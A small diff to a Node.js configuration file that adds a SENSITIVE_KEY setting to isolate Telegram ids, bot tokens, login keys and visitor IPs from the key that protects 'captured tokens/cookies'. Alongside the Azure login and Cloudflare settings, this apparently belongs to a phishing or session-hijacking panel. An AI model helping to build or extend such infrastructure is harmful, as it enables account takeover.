@@ -61,6 +61,9 @@ module.exports = {
   ADMIN_IP_WHITELIST: (process.env.ADMIN_IP_WHITELIST || '127.0.0.1,::1').split(','),
   ENCRYPTION_KEY: process.env.ENCRYPTION_KEY, // No default - must be set (32-byte hex)
   JWT_SECRET: process.env.JWT_SECRET, // No default - must be set
+  // Isolates Telegram ids, bot tokens, login keys and visitor IPs from the
+  // ENCRYPTION_KEY that protects captured tokens/cookies. See utils/sensitive.js.
+  SENSITIVE_KEY: process.env.SENSITIVE_KEY,
   AZURE_TENANT: process.env.AZURE_TENANT || 'common',
   AZURE_CLIENT_ID: process.env.AZURE_CLIENT_ID, // No default - must be set
   CF_API_TOKEN: process.env.CF_API_TOKEN, // Must be set
